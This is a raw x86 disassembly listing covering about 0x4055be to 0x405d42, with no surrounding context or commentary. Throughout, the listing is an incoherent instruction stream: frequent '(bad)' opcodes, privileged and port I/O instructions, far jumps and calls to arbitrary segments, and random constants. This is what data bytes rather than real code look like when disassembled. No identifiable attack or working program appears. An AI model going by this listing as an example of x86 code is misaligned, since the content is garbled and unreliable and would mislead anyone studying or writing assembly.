  4055be:	mov    ah,0x58
  4055c0:	jo     0x405636
  4055c2:	in     eax,dx
  4055c3:	push   edi
  4055c4:	mov    ebp,0x187e1feb
  4055c9:	pushf  
  4055ca:	rol    DWORD PTR [eax],1
  4055cc:	lods   al,BYTE PTR ds:[esi]
  4055cd:	pop    ebp
  4055ce:	ds (bad) 
  4055d0:	stos   DWORD PTR es:[edi],eax
  4055d1:	ret    0x34a
  4055d4:	xchg   ebx,eax
  4055d5:	sbb    ebp,DWORD PTR [esi]
  4055d7:	add    cl,bl
  4055d9:	pop    eax
  4055da:	stc    
  4055db:	test   ecx,esp
  4055dd:	lods   eax,DWORD PTR ds:[esi]
  4055de:	adc    al,0xff
  4055e0:	dec    eax
  4055e1:	popa   
  4055e2:	cvtdq2ps xmm4,XMMWORD PTR fs:[edx-0x76]
  4055e7:	popa   
  4055e8:	mov    bh,0x4
  4055ea:	call   0x460046af
  4055ef:	(bad)  
  4055f0:	stc    
  4055f1:	sbb    al,0x5c
  4055f3:	fcmovnu st,st(3)
  4055f5:	mov    ebx,DWORD PTR [eax-0x57]
  4055f8:	ins    DWORD PTR es:[edi],dx
  4055f9:	or     DWORD PTR [ebx-0x74],esi
  4055fc:	mul    DWORD PTR [bx]
  4055ff:	add    al,0x46
  405601:	push   0xd84de97b
  405606:	jae    0x405658
  405608:	fs jno 0x405647
  40560b:	xor    ch,bl
  40560d:	pop    es
  40560e:	shl    BYTE PTR [ecx-0x64987aad],cl
  405614:	fadd   st(3),st
  405616:	jp     0x4055e5
  405618:	stc    
  405619:	xor    eax,0x3b69cc57
  40561e:	adc    DWORD PTR [edi+0xbf6b9f4],edx
  405624:	xor    esi,DWORD PTR [eax]
  405626:	cdq    
  405627:	adc    esi,DWORD PTR [ebx]
  405629:	in     al,dx
  40562a:	jl     0x4055b2
  40562c:	xchg   esi,eax
  40562d:	xor    al,0x2
  40562f:	retw   
  405631:	popa   
  405632:	stc    
  405633:	add    al,0xc6
  405635:	sti    
  405636:	sub    ah,BYTE PTR [edi+0x49]
  405639:	mov    ds:0x4e502142,eax
  40563e:	push   edx
  40563f:	cmc    
  405640:	mov    edx,0xb9356ef9
  405645:	iret   
  405646:	iret   
  405647:	ret    
  405648:	call   0x8624765
  40564d:	mov    cl,0x77
  40564f:	and    cl,0x25
  405652:	loop   0x405650
  405654:	jl     0x405695
  405656:	popa   
  405657:	cmp    al,BYTE PTR [edi+0x6d868d5b]
  40565d:	mov    eax,0xa63b19da
  405662:	push   edx
  405663:	fwait
  405664:	or     edi,DWORD PTR [ebx+0x33fd4c87]
  40566a:	pop    ds
  40566b:	pop    es
  40566c:	in     al,0x2d
  40566e:	jmp    0xd8de:0x722de9f9
  405675:	adc    ch,dh
  405677:	(bad)  [edx+0x21]
  40567a:	call   0xf8b1:0x42ecab4a
  405681:	loope  0x405614
  405683:	cmp    eax,DWORD PTR [eax+edx*8-0x4be521c3]
  40568a:	mov    bl,0xa
  40568c:	aas    
  40568d:	cdq    
  40568e:	cmp    DWORD PTR [edi-0x1a],ebx
  405691:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405692:	iret   
  405693:	iret   
  405694:	adc    BYTE PTR [edi-0x41],dh
  405697:	add    eax,0x18e4f1dc
  40569c:	xchg   ebx,eax
  40569d:	jae    0x405702
  40569f:	pusha  
  4056a0:	call   0x3e1a29b3
  4056a5:	sbb    edi,ecx
  4056a7:	jle    0x4056bb
  4056a9:	jne    0x405630
  4056ab:	mov    al,ds:0xe48a2dea
  4056b0:	jbe    0x405650
  4056b2:	je     0x405651
  4056b4:	lahf   
  4056b5:	and    BYTE PTR ds:0x50508dc,cl
  4056bb:	bound  edx,QWORD PTR [edi-0x2014a3b5]
  4056c1:	xor    al,0xb8
  4056c3:	add    bh,dh
  4056c5:	sub    DWORD PTR [edx-0x70e9c67e],0x2960ce5b
  4056cf:	les    esp,FWORD PTR [eax]
  4056d1:	and    DWORD PTR [edx],0xffffffba
  4056d4:	out    0x40,eax
  4056d6:	ror    DWORD PTR [edx+ebp*2-0x7f1feba3],0xb4
  4056de:	hlt    
  4056df:	sbb    ah,al
  4056e1:	push   0xffffffde
  4056e3:	(bad)  
  4056e4:	retf   0x2610
  4056e7:	xchg   ebx,eax
  4056e8:	outs   dx,DWORD PTR ds:[esi]
  4056e9:	shl    DWORD PTR [ecx+0x30],cl
  4056ec:	jno    0x40566e
  4056ee:	jmp    0x2acc:0x610f8403
  4056f5:	add    cl,BYTE PTR [ecx+0x18f20a25]
  4056fb:	add    edi,DWORD PTR [edi-0x31989585]
  405701:	pop    esp
  405702:	mov    ebp,0x7133fba1
  405707:	sub    al,0x46
  405709:	mov    bh,0x89
  40570b:	scas   eax,DWORD PTR es:[edi]
  40570c:	rol    DWORD PTR [edx+0x23e7a311],0x6e
  405713:	xchg   esp,eax
  405714:	fiadd  DWORD PTR [ebx+0x1b]
  405717:	into   
  405718:	test   DWORD PTR [eax-0x6a],ebx
  40571b:	push   ss
  40571c:	(bad)  
  40571e:	das    
  40571f:	and    eax,0x1e3b720d
  405724:	push   edi
  405725:	adc    edx,DWORD PTR [ecx+0x2c5faac2]
  40572b:	mov    ds:0x3069fac8,eax
  405730:	stc    
  405731:	jne    0x405774
  405733:	sar    BYTE PTR [eax-0x15],0xab
  405737:	mov    dh,0x2a
  405739:	push   ecx
  40573a:	loop   0x405731
  40573c:	dec    esp
  40573d:	jg     0x40573f
  40573f:	fistp  WORD PTR [eax-0x5c]
  405742:	add    al,0x1f
  405744:	data16 add BYTE PTR [ebx+0x18],0xf6
  405749:	fild   QWORD PTR ds:0x72b202ef
  40574f:	push   eax
  405750:	lods   eax,DWORD PTR ds:[esi]
  405751:	jg     0x4057ce
  405753:	pop    es
  405754:	jbe    0x4057ab
  405756:	mov    bh,0xb6
  405758:	out    dx,al
  405759:	jnp    0x4057a7
  40575b:	mov    al,0xf8
  40575d:	push   esp
  40575e:	jl     0x40575b
  405760:	mov    ebx,0xa3b1fd2
  405765:	stc    
  405766:	test   DWORD PTR [edi-0xa6bdee8],edi
  40576c:	hlt    
  40576d:	call   0x9296:0xfe5da9a1
  405774:	fdiv   DWORD PTR [ebp+0x3e389169]
  40577a:	outs   dx,BYTE PTR ds:[esi]
  40577b:	or     cl,bl
  40577d:	or     ebx,eax
  40577f:	int    0x2a
  405781:	pop    ss
  405782:	shl    BYTE PTR [edx+0x258075b7],1
  405788:	gs push 0x6d
  40578b:	pop    ds
  40578c:	sbb    al,0x7a
  40578e:	or     BYTE PTR [ebx-0x5],cl
  405791:	call   0x964:0x4600127d
  405798:	mov    ?,esi
  40579a:	push   ebp
  40579b:	push   ebx
  40579c:	lds    edx,FWORD PTR [edx+0x73]
  40579f:	and    esi,DWORD PTR [edx]
  4057a1:	out    dx,eax
  4057a2:	mov    ds:0xf53d6842,al
  4057a7:	aas    
  4057a8:	xchg   esp,eax
  4057a9:	(bad)  
  4057ab:	sub    DWORD PTR [eax-0x55],0x6d
  4057af:	enter  0xc025,0x26
  4057b3:	cs aas 
  4057b5:	push   esi
  4057b6:	(bad)  
  4057b7:	addr16 sub bl,dh
  4057ba:	add    ebp,ebx
  4057bc:	add    al,0xb5
  4057be:	je     0x4057dc
  4057c0:	test   BYTE PTR [ecx],0x9f
  4057c3:	dec    ecx
  4057c4:	pusha  
  4057c5:	jmp    0xcde9f2a5
  4057ca:	ins    BYTE PTR es:[edi],dx
  4057cb:	pcmpeqb mm6,QWORD PTR [esi+0x6f143e78]
  4057d2:	stos   BYTE PTR es:[edi],al
  4057d3:	popa   
  4057d4:	push   ebp
  4057d5:	xor    al,0xd8
  4057d7:	imul   edx,DWORD PTR [ebx-0x7f],0x79c0da5a
  4057de:	ins    DWORD PTR es:[edi],dx
  4057df:	push   ebp
  4057e0:	pop    eax
  4057e1:	and    BYTE PTR [ecx],cl
  4057e3:	inc    esi
  4057e4:	sub    dl,dh
  4057e6:	loop   0x4057d0
  4057e8:	mov    BYTE PTR [esi],al
  4057ea:	inc    edx
  4057eb:	fs in  al,0x5e
  4057ee:	push   ecx
  4057ef:	push   ss
  4057f0:	mov    WORD PTR [ecx+0x50],ds
  4057f3:	(bad)  
  4057f4:	pop    ebp
  4057f5:	cld    
  4057f6:	das    
  4057f7:	nop
  4057f8:	jl     0x40578c
  4057fa:	test   DWORD PTR [ebx],esi
  4057fc:	mov    eax,0x709db296
  405801:	xchg   esi,eax
  405802:	dec    esp
  405803:	add    edi,DWORD PTR ss:[eax-0x7a]
  405807:	and    eax,0xf1329019
  40580c:	stc    
  40580d:	imul   edi,DWORD PTR [ebp+0x4c],0x42
  405811:	scas   al,BYTE PTR es:[edi]
  405812:	push   ecx
  405813:	pop    ss
  405814:	(bad)
  405819:	xchg   ebx,eax
  40581a:	ins    DWORD PTR es:[edi],dx
  40581b:	add    eax,0x227bc220
  405820:	in     eax,0x7d
  405822:	dec    eax
  405823:	stos   DWORD PTR es:[edi],eax
  405824:	xor    DWORD PTR [eax+eiz*4+0x6],ecx
  405828:	sub    al,0xb5
  40582a:	push   esi
  40582b:	xchg   ebp,eax
  40582c:	stos   BYTE PTR es:[edi],al
  40582d:	aaa    
  40582e:	sbb    ecx,DWORD PTR [edi+0x4b]
  405831:	(bad)  
  405832:	adc    ecx,ebp
  405834:	fild   WORD PTR [ebp+0x4d]
  405837:	cmp    al,0xd
  405839:	ret    
  40583a:	xchg   ecx,eax
  40583b:	jnp    0x40588d
  40583d:	pop    edi
  40583e:	xor    ebp,DWORD PTR [ecx]
  405840:	lea    edx,[edi+0x5b]
  405843:	push   es
  405844:	inc    esp
  405845:	lahf   
  405846:	(bad)  
  405847:	pushf  
  405848:	pop    ebp
  405849:	fld    DWORD PTR [edx]
  40584b:	test   al,0x13
  40584d:	mov    BYTE PTR [ecx],ah
  40584f:	mov    esi,0x2b481c1b
  405854:	jecxz  0x40582b
  405856:	xchg   edx,eax
  405857:	inc    ecx
  405858:	nop
  405859:	push   ebx
  40585a:	and    ebx,ebx
  40585c:	and    DWORD PTR [ebx],ebp
  40585e:	call   0xbed:0xf2d8fd5c
  405865:	sbb    ebp,edx
  405867:	stos   DWORD PTR es:[edi],eax
  405868:	bound  esi,QWORD PTR [eax-0x75]
  40586b:	mov    dh,0xa2
  40586d:	push   cs
  40586e:	adc    al,0x2b
  405870:	retf   0x9457
  405873:	cdq    
  405874:	inc    edi
  405875:	popa   
  405876:	test   BYTE PTR [eax],0xc6
  405879:	mov    bh,0xc8
  40587b:	mov    WORD PTR [ebp-0x10bafbeb],ds
  405881:	push   edi
  405882:	stos   DWORD PTR es:[edi],eax
  405883:	imul   edx,esp,0x31dce839
  405889:	pop    ecx
  40588a:	test   edx,ebx
  40588c:	dec    esp
  40588d:	popf   
  40588e:	ins    DWORD PTR es:[edi],dx
  40588f:	dec    edi
  405890:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405891:	pop    esp
  405892:	jne    0x4058e7
  405894:	jns    0x4058b8
  405896:	or     al,0x27
  405898:	cmp    BYTE PTR [ebp+edi*8-0x47],ch
  40589c:	lea    esi,[edx]
  40589e:	imul   esi,DWORD PTR [ebp+0x1f],0x9bf2a75f
  4058a5:	dec    eax
  4058a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058a8:	inc    ecx
  4058a9:	das    
  4058aa:	cli    
  4058ab:	push   esi
  4058ac:	jne    0x4058fa
  4058ae:	dec    esi
  4058af:	mov    esp,0xe8c9f735
  4058b4:	mov    ch,0xe7
  4058b6:	sbb    edx,DWORD PTR [edx+0x113637b2]
  4058bc:	push   eax
  4058bd:	mov    ch,bh
  4058bf:	jp     0x4058f7
  4058c1:	adc    ebp,esi
  4058c3:	push   es
  4058c4:	mov    BYTE PTR [eax],al
  4058c6:	dec    esi
  4058c7:	ins    DWORD PTR es:[edi],dx
  4058c8:	das    
  4058c9:	les    esp,FWORD PTR [edi+eax*2+0x40051c27]
  4058d0:	out    0xb,eax
  4058d2:	icebp  
  4058d3:	pushf  
  4058d4:	push   ds
  4058d5:	xchg   edx,eax
  4058d6:	fstp   TBYTE PTR [ecx-0x52]
  4058d9:	in     al,0x4d
  4058db:	daa    
  4058dc:	inc    ebx
  4058dd:	xchg   edi,eax
  4058de:	jmp    0x405930
  4058e0:	lahf   
  4058e1:	pop    edx
  4058e2:	outs   dx,BYTE PTR ds:[esi]
  4058e3:	jl     0x4058ae
  4058e5:	push   ecx
  4058e6:	leave  
  4058e7:	arpl   WORD PTR [esi+0x31],cx
  4058ea:	sbb    eax,0xcb70f9bf
  4058ef:	jmp    0x795672e6
  4058f4:	retf   0x41e4
  4058f7:	sbb    al,0xa1
  4058f9:	pop    ebx
  4058fa:	push   es
  4058fb:	rol    BYTE PTR [edx+0x5f],cl
  4058fe:	cmp    BYTE PTR [ebx-0xff8b117],ch
  405904:	fcom   QWORD PTR [edx+ebx*8+0x3d]
  405908:	sub    al,0xf8
  40590a:	xor    bl,dh
  40590c:	cmp    dl,cl
  40590e:	(bad)  
  405910:	imul   eax,DWORD PTR [edx+0x66],0x10
  405914:	push   ebx
  405915:	call   0xf2de:0xd4fde3fe
  40591c:	iret   
  40591d:	pop    ecx
  40591e:	mov    edx,0x54f4a4ce
  405923:	lods   eax,DWORD PTR ds:[esi]
  405924:	mov    ds:0xb6bc0232,al
  405929:	pop    ss
  40592a:	call   0xf47b0032
  40592f:	xchg   dh,ch
  405931:	outs   dx,DWORD PTR ds:[esi]
  405932:	addr16 xchg esp,eax
  405934:	stos   DWORD PTR es:[edi],eax
  405935:	outs   dx,DWORD PTR ds:[esi]
  405936:	mov    esp,0x1bbb875
  40593b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40593c:	fwait
  40593d:	and    BYTE PTR ds:0x67108f71,dh
  405943:	out    dx,al
  405944:	cmp    dh,BYTE PTR [edi]
  405946:	jmp    0xbc65:0x12c9c1bf
  40594d:	jns    0x40592f
  40594f:	scas   eax,DWORD PTR es:[edi]
  405950:	ja     0x405977
  405952:	inc    edx
  405953:	loope  0x4058d5
  405955:	addr16 push ecx
  405957:	in     eax,dx
  405958:	pop    esi
  405959:	mov    dl,0x44
  40595b:	dec    eax
  40595d:	mov    bl,0xe9
  40595f:	pop    esp
  405960:	dec    esi
  405961:	jne    0x405944
  405963:	jb     0x40591f
  405965:	pop    edi
  405966:	dec    ebx
  405967:	fwait
  405968:	in     al,dx
  405969:	xchg   esp,eax
  40596a:	inc    edi
  40596b:	dec    eax
  40596c:	jecxz  0x40596b
  40596e:	dec    esi
  40596f:	jp     0x40595c
  405971:	push   ss
  405972:	mov    ecx,0x17483a68
  405977:	inc    ebx
  405978:	mov    eax,esi
  40597a:	stos   DWORD PTR es:[edi],eax
  40597b:	push   ss
  40597c:	inc    esi
  40597d:	push   cs
  40597e:	mov    esp,0x79e9cc9f
  405983:	inc    DWORD PTR [ebp+0x40]
  405986:	mov    ch,0xe7
  405988:	retf   
  405989:	scas   eax,DWORD PTR es:[edi]
  40598a:	jb     0x4059bf
  40598c:	and    DWORD PTR [edx-0x31],ebx
  40598f:	cli    
  405990:	cmp    ah,BYTE PTR [esi]
  405992:	pop    esi
  405993:	lods   al,BYTE PTR ds:[esi]
  405994:	shl    BYTE PTR [ebx+0x1e232ef4],1
  40599a:	(bad)  
  40599b:	sub    al,BYTE PTR [eax+0x22]
  40599e:	dec    ecx
  40599f:	out    0x52,eax
  4059a1:	dec    ebp
  4059a2:	mov    esi,0x837975f2
  4059a7:	test   BYTE PTR [edx],0xea
  4059aa:	push   0x6d
  4059ac:	cli    
  4059ad:	xchg   edi,eax
  4059ae:	out    0xc9,eax
  4059b0:	mov    bl,0x85
  4059b2:	mov    bl,BYTE PTR [ebx+0x67be1a25]
  4059b8:	sbb    al,0xaa
  4059ba:	in     al,dx
  4059bb:	aas    
  4059bc:	bound  ebx,QWORD PTR [edi]
  4059be:	jbe    0x4059a6
  4059c0:	sub    bl,bh
  4059c2:	add    esp,DWORD PTR [edi]
  4059c4:	cwde   
  4059c5:	stc    
  4059c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059c7:	mov    ds:0x9768c508,eax
  4059cc:	mov    ch,0xd0
  4059ce:	xchg   DWORD PTR [ecx+0x43],edx
  4059d1:	cs push 0x6c1f11bc
  4059d7:	sbb    BYTE PTR [edx+esi*4],ch
  4059da:	(bad)  
  4059db:	sbb    dh,BYTE PTR [eax+0x5e501f84]
  4059e1:	xchg   ecx,eax
  4059e2:	dec    ebx
  4059e3:	ins    DWORD PTR es:[edi],dx
  4059e4:	pop    ds
  4059e5:	mov    ebx,0xeb19361
  4059ea:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4059ec:	int    0x56
  4059ee:	xchg   esi,eax
  4059ef:	in     eax,0xe8
  4059f1:	shr    DWORD PTR [edx-0x7d2f3073],1
  4059f7:	sbb    BYTE PTR [esi+edx*8+0x71],dh
  4059fb:	jmp    0xed63:0x668e6b5a
  405a02:	into   
  405a03:	loope  0x4059d9
  405a05:	pop    ebp
  405a06:	xchg   esi,eax
  405a07:	mov    esp,ds
  405a09:	xor    BYTE PTR [edx+0xc],ah
  405a0c:	xor    al,BYTE PTR [edx]
  405a0e:	pop    esi
  405a0f:	mov    bl,0x41
  405a11:	stos   BYTE PTR es:[edi],al
  405a12:	hlt    
  405a13:	(bad)  
  405a14:	ficom  WORD PTR [ebp+0x41]
  405a17:	rcr    dl,cl
  405a19:	and    ebp,DWORD PTR [eax-0x328f04ee]
  405a1f:	mov    al,ds:0x7ff36b5d
  405a24:	loop   0x405a4f
  405a26:	scas   eax,DWORD PTR es:[edi]
  405a27:	sbb    dh,BYTE PTR [ebx+ebp*2-0x7e]
  405a2b:	ja     0x405a49
  405a2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a2e:	je     0x4059ee
  405a30:	jb     0x405a5c
  405a32:	dec    edx
  405a33:	mov    WORD PTR [eax],ss
  405a35:	or     DWORD PTR [esi+0x7e],0xffffff86
  405a39:	aaa    
  405a3a:	fwait
  405a3b:	inc    si
  405a3d:	(bad)  
  405a3e:	(bad)  
  405a3f:	imul   edi,DWORD PTR [ecx+0x1d],0x6eeec357
  405a46:	or     eax,0x91d06be4
  405a4b:	pop    di
  405a4d:	and    DWORD PTR [ebp-0x5d],esi
  405a50:	adc    edi,DWORD PTR [esi+0x44]
  405a53:	in     eax,0xb4
  405a55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a56:	mov    fs,WORD PTR [ecx+0x36]
  405a59:	popf   
  405a5a:	adc    DWORD PTR [eax-0x6d],0xffffff9c
  405a5e:	push   es
  405a5f:	fild   DWORD PTR [eax+edx*8-0x41]
  405a63:	pop    ebx
  405a64:	xchg   edx,eax
  405a65:	mov    ebx,0xc1d56956
  405a6a:	fistp  DWORD PTR [edx+eax*8-0x9c6f7b8]
  405a71:	out    dx,eax
  405a72:	push   es
  405a73:	mov    ecx,DWORD PTR [esi]
  405a75:	add    al,BYTE PTR [ecx]
  405a77:	jmp    0x954a:0xc51b87d5
  405a7e:	add    esi,edx
  405a80:	push   esi
  405a81:	inc    edx
  405a82:	inc    edi
  405a83:	mov    dh,0xbd
  405a85:	sub    eax,0xfd8abd4
  405a8a:	adc    al,0xe7
  405a8c:	xlat   BYTE PTR ds:[ebx]
  405a8d:	inc    esi
  405a8e:	fst    DWORD PTR [edi-0x6b]
  405a91:	rcl    dl,0x53
  405a94:	adc    eax,0xbb337dc7
  405a99:	or     BYTE PTR [ecx],bh
  405a9b:	push   ss
  405a9c:	je     0x405aa9
  405a9e:	mov    bl,0x81
  405aa0:	inc    ebp
  405aa1:	int    0x38
  405aa3:	add    DWORD PTR [ebx+0x716a5c21],ebx
  405aa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405aaa:	ins    BYTE PTR es:[edi],dx
  405aab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405aac:	retf   0x7966
  405aaf:	xchg   edx,eax
  405ab0:	jmp    0x405aba
  405ab2:	xor    BYTE PTR [eax+0x37541059],0x50
  405ab9:	jb     0x405a82
  405abb:	xor    eax,0x238d66ee
  405ac0:	adc    ecx,ebp
  405ac2:	scas   eax,DWORD PTR es:[edi]
  405ac3:	dec    edi
  405ac4:	jae    0x405ab2
  405ac6:	cmp    bl,BYTE PTR [esi+0x34]
  405ac9:	pusha  
  405aca:	or     ah,cl
  405acc:	pop    edx
  405acd:	icebp  
  405ace:	(bad)  
  405ad0:	ds out dx,eax
  405ad2:	mov    al,0x31
  405ad4:	jle    0x405ae2
  405ad6:	(bad)  
  405ad7:	call   DWORD PTR [ebp+0x601ad4e7]
  405add:	cdq    
  405ade:	loopne 0x405aea
  405ae0:	shr    DWORD PTR [edx+edi*2+0x47],1
  405ae4:	addr16 mov ebx,0xc853f6ed
  405aea:	out    dx,al
  405aeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405aec:	xor    dh,BYTE PTR [eax-0x50]
  405aef:	in     eax,0x44
  405af1:	mov    ss,WORD PTR [ebx+edx*2-0xb3e6e7a]
  405af8:	xor    al,0x94
  405afa:	jg     0x405b58
  405afc:	icebp  
  405afd:	test   DWORD PTR [ebp-0x4f],edx
  405b00:	push   esp
  405b01:	cmp    bl,BYTE PTR [ebx-0x2f]
  405b04:	setge  BYTE PTR [esp+ebp*4]
  405b08:	adc    al,0xee
  405b0a:	mov    ds:0x3af81966,al
  405b0f:	and    DWORD PTR [ebx-0x5e],eax
  405b12:	jnp    0x405b6b
  405b14:	mov    cl,0x5c
  405b16:	and    BYTE PTR [ecx+edi*4],bl
  405b19:	enter  0x9bb3,0x1d
  405b1d:	push   edi
  405b1e:	scas   eax,DWORD PTR es:[edi]
  405b1f:	outs   dx,BYTE PTR ds:[esi]
  405b20:	fsub   DWORD PTR [ebx+0x8]
  405b23:	std    
  405b24:	cs cli 
  405b26:	out    dx,al
  405b27:	and    eax,0x59d8c0dc
  405b2c:	fcmovnu st,st(2)
  405b2e:	mov    cl,0xde
  405b30:	pop    eax
  405b31:	cld    
  405b32:	dec    ebp
  405b33:	rcr    DWORD PTR [ecx+0x3c],0x33
  405b37:	mov    eax,ds:0xc54b1edd
  405b3c:	sti    
  405b3d:	lods   eax,DWORD PTR ds:[esi]
  405b3e:	pushf  
  405b3f:	ret    
  405b40:	movups XMMWORD PTR [edx],xmm7
  405b43:	cmp    al,0x96
  405b45:	push   eax
  405b46:	add    BYTE PTR [ecx+0x48de2c9b],al
  405b4c:	xor    eax,0x6660557e
  405b51:	repz and eax,DWORD PTR [ebx]
  405b54:	gs pusha 
  405b56:	(bad)  
  405b58:	dec    ebp
  405b59:	lods   eax,DWORD PTR ds:[esi]
  405b5a:	xchg   BYTE PTR [ecx+0x3e819705],al
  405b60:	sar    DWORD PTR [ebp-0x6],cl
  405b63:	mov    BYTE PTR [edi],cl
  405b65:	retf   
  405b66:	into   
  405b67:	cmp    eax,0xf7c4cbf2
  405b6c:	in     al,dx
  405b6d:	or     BYTE PTR [ecx],bl
  405b6f:	jb     0x405b87
  405b71:	cdq    
  405b72:	mov    ds:0x3aee90b0,al
  405b77:	add    al,0x4
  405b79:	ret    
  405b7a:	repz pushf 
  405b7c:	das    
  405b7d:	xchg   edi,eax
  405b7e:	inc    edi
  405b7f:	xor    edx,DWORD PTR [esi]
  405b81:	nop
  405b82:	jns    0x405b45
  405b84:	sbb    ch,cl
  405b86:	xor    DWORD PTR [eax-0x75],ebp
  405b89:	jno    0x405c08
  405b8b:	jecxz  0x405bb9
  405b8d:	and    al,0x11
  405b8f:	(bad)  [edx-0x5f]
  405b92:	cli    
  405b93:	aam    0xf
  405b95:	cmp    al,0x7e
  405b97:	in     al,0xf1
  405b99:	das    
  405b9a:	and    ebp,esi
  405b9c:	jmp    0x9f09:0x9d42ddf6
  405ba3:	sub    ah,BYTE PTR [ebx-0x34]
  405ba6:	sub    BYTE PTR [edx+0x251da061],0x69
  405bad:	sub    al,0x9f
  405baf:	fsub   QWORD PTR [esi+0x1789e5b3]
  405bb5:	imul   edi,DWORD PTR [eax-0x5ed197d3],0x6e23bf1b
  405bbf:	sub    eax,0x9a2ad347
  405bc4:	lods   eax,DWORD PTR ds:[esi]
  405bc5:	or     BYTE PTR [esi],0xff
  405bc8:	pop    esp
  405bc9:	add    al,0xa8
  405bcb:	push   eax
  405bcc:	mov    ebp,0x88a9971c
  405bd1:	pop    esi
  405bd2:	iret   
  405bd3:	cmp    dh,BYTE PTR [eax+0x73]
  405bd6:	mov    esp,edi
  405bd8:	loopne 0x405c2f
  405bda:	jnp    0x405bf9
  405bdc:	xchg   ecx,eax
  405bdd:	mov    eax,0xa865cd18
  405be2:	nop
  405be3:	push   edi
  405be4:	sbb    ah,BYTE PTR [edx-0x6b785a10]
  405bea:	jg     0x405b84
  405bec:	inc    edi
  405bed:	xor    edi,DWORD PTR [edx+0x21]
  405bf0:	lea    ecx,[esi-0x70b3f2e6]
  405bf6:	dec    ecx
  405bf7:	cmp    eax,0xaf2d7bbe
  405bfc:	xor    eax,0xd1d4666
  405c01:	xchg   ebx,eax
  405c02:	popa   
  405c03:	jl     0x405c18
  405c05:	adc    dl,dl
  405c07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c08:	jne    0x405bab
  405c0a:	and    BYTE PTR [esi-0x3187ab27],dl
  405c10:	shl    BYTE PTR ds:0x34a94d35,1
  405c16:	add    eax,0xd2cc5271
  405c1b:	mov    ah,0xe9
  405c1d:	xchg   esp,eax
  405c1e:	pop    ecx
  405c1f:	std    
  405c20:	(bad)  
  405c21:	cdq    
  405c22:	push   ss
  405c23:	mov    dl,0x53
  405c25:	jns    0x405bc0
  405c27:	cs pusha 
  405c29:	(bad)
  405c2c:	cld    
  405c2d:	pop    esi
  405c2e:	sbb    edi,esp
  405c30:	mov    ecx,0xdf3226c5
  405c35:	enter  0xaf53,0x88
  405c39:	mov    ecx,0x6fb579fa
  405c3e:	mov    al,ds:0xc92ea91f
  405c43:	pop    es
  405c44:	outs   dx,DWORD PTR ds:[esi]
  405c45:	ficomp DWORD PTR [ebx]
  405c47:	rcr    esi,1
  405c49:	add    al,0x2
  405c4b:	(bad)  
  405c4c:	mov    ecx,0x34b0dc21
  405c51:	inc    ecx
  405c52:	and    BYTE PTR [edi+0x7b21ae15],dh
  405c58:	jns    0x405bfa
  405c5a:	(bad)  
  405c5b:	push   esi
  405c5c:	sti    
  405c5d:	push   ecx
  405c5e:	sub    BYTE PTR [eax-0x6b7a25c4],cl
  405c64:	dec    edx
  405c65:	inc    ecx
  405c66:	pop    edi
  405c67:	mov    dh,0x98
  405c69:	jp     0x405cd6
  405c6b:	lods   al,BYTE PTR ds:[esi]
  405c6c:	or     eax,0x5ec31c2
  405c71:	xchg   edx,eax
  405c72:	in     eax,dx
  405c73:	jbe    0x405c5c
  405c75:	cmp    al,0xc5
  405c77:	stc    
  405c78:	pop    esp
  405c79:	jp     0x405c1b
  405c7b:	or     al,0x2f
  405c7e:	adc    ch,BYTE PTR [esi+0x42]
  405c81:	sbb    BYTE PTR [eax+0x79f2c8a7],0xf4
  405c88:	jo     0x405ca1
  405c8a:	repnz sub eax,0xd2247af3
  405c90:	sub    BYTE PTR [ecx-0x370f3ccf],dl
  405c96:	test   DWORD PTR [edi+0x1dc933d4],ebp
  405c9c:	imul   ebp,eax,0xf140e5d5
  405ca2:	mov    bl,0x76
  405ca4:	xor    DWORD PTR [esi-0x35b1ebde],esi
  405caa:	push   0x6dd6c340
  405caf:	cmp    dl,ch
  405cb1:	cmp    bh,ch
  405cb3:	jmp    0x57c7:0x64d4fb62
  405cba:	rcpps  xmm5,xmm4
  405cbd:	pop    ebp
  405cbe:	inc    edi
  405cbf:	in     al,dx
  405cc0:	sub    esp,esi
  405cc2:	loop   0x405c93
  405cc4:	xchg   ebx,eax
  405cc5:	or     cl,ch
  405cc7:	(bad)  
  405cc8:	ins    DWORD PTR es:[edi],dx
  405cc9:	mov    al,ds:0x99f7cf9d
  405cce:	cmp    bl,0xf7
  405cd1:	and    BYTE PTR [esi-0x7f8c164f],0x91
  405cd8:	(bad)  
  405cd9:	outs   dx,DWORD PTR ds:[esi]
  405cda:	mov    ds:0x12e3f0c8,al
  405cdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ce0:	jmp    0x7093:0x632190c9
  405ce7:	jns    0x405d43
  405ce9:	mov    dl,0xe1
  405ceb:	pop    edx
  405cec:	mov    ds:0x10af6227,eax
  405cf1:	clc    
  405cf2:	mov    ds:0x6063dc18,al
  405cf7:	hlt    
  405cf8:	div    DWORD PTR [edx-0x3a]
  405cfb:	leave  
  405cfc:	bound  esi,QWORD PTR [ebx+0x11273e81]
  405d02:	jp     0x405cdc
  405d04:	icebp  
  405d05:	cmp    al,0x83
  405d07:	fdivp  st(0),st
  405d09:	dec    eax
  405d0b:	mov    dl,ah
  405d0d:	pusha  
  405d0e:	dec    edi
  405d0f:	cmp    DWORD PTR [ecx],ebp
  405d11:	cli    
  405d12:	sbb    eax,0xa5005d50
  405d17:	shr    dl,0x63
  405d1a:	hlt    
  405d1b:	daa    
  405d1c:	sbb    eax,0x15862c02
  405d21:	inc    esp
  405d22:	pop    ecx
  405d23:	cwde   
  405d24:	mov    ds:0x23cd4d7e,eax
  405d29:	mov    cl,0x8f
  405d2b:	(bad)  
  405d2c:	daa    
  405d2d:	int    0xd3
  405d2f:	loope  0x405d7b
  405d31:	les    ecx,FWORD PTR [esi+eiz*1+0x41ae0e38]
  405d38:	adc    al,0x49
  405d3a:	icebp  
  405d3b:	dec    ebp
  405d3c:	cmp    esp,DWORD PTR [ecx-0x95bace2]
  405d42:	(bad)  
